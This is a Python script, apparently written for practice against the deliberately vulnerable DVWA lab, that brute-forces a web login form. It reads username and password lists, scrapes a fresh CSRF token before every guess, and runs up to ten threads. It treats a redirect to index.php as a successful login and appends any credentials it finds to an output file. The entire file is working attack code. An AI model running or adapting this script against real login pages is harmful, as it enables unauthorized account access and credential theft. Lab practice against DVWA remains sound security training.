import requests
import threading
import queue
import argparse
import os
from bs4 import BeautifulSoup

outputLock = threading.Lock()


def getCsrfToken(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_element = soup.find('input', {'name': 'user_token'})
    if token_element:
        return token_element['value']
    return None


def workerThread(url, usernameQueue, passwords, outputFile=None):
    with requests.Session() as session:
        while not usernameQueue.empty():
            username = usernameQueue.get()
            for password in passwords:
                csrf_token = getCsrfToken(session, url)
                if not csrf_token:
                    print("Error retrieving CSRF token in thread. Exiting thread.")
                    return
                data = {
                    'username': username,
                    'password': password,
                    'Login': 'Login',
                    'user_token': csrf_token
                }

                response = session.post(url, data=data, allow_redirects=False)
                if response.status_code == 302 and response.headers['Location'] == 'index.php':
                    print(f"Credentials found: {username}:{password}")
                    if outputFile:
                        with outputLock:
                            with open(outputFile, 'a') as f:
                                f.write(f"{username}:{password}\n")
                    return


def bruteForce(url, usernamelist, passwordlist, outputFile=None):
    with open(usernamelist, 'r') as f:
        usernames = [line.strip() for line in f]

    with open(passwordlist, 'r') as f:
        passwords = [line.strip() for line in f]

    usernameQueue = queue.Queue()
    for username in usernames:
        usernameQueue.put(username)

    thread_count = min(10, len(usernames))

    threads = []

    for _ in range(thread_count):
        t = threading.Thread(target=workerThread, args=(url, usernameQueue, passwords, outputFile))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Brute-force DVWA login.')
    parser.add_argument('--url', '-u', required=True, help='Base URL of DVWA (e.g. http://localhost/DVWA/login.php)')
    parser.add_argument('--usernamelist', '-ul', required=True, help='Path to username list')
    parser.add_argument('--passwordlist', '-pl', required=True, help='Path to password list')
    parser.add_argument('--output', '-o', help='output file')

    args = parser.parse_args()
    if not args.url:
        print("Error: url does not exist!")
        exit(1)
    if args.usernamelist is None or args.passwordlist is None:
        print("Error: Provide  usernamelist and passwordlist!")
        exit(1)

    if args.usernamelist:
        args.usernamelist = os.path.abspath(args.usernamelist)
        if not os.path.exists(args.usernamelist):
            print("Error: Username-list does not exist!")
            exit(1)

    if args.passwordlist:
        args.passwordlist = os.path.abspath(args.passwordlist)
        if not os.path.exists(args.passwordlist):
            print("Error: Password-list does not exist!")
            exit(1)

    if args.output:
        args.output = os.path.abspath(args.output)
        output_dir = os.path.dirname(args.output)
        if not os.path.exists(output_dir):
            print("Error: Output directory does not exist!")
            exit(1)

    bruteForce(args.url, args.usernamelist, args.passwordlist, args.output)
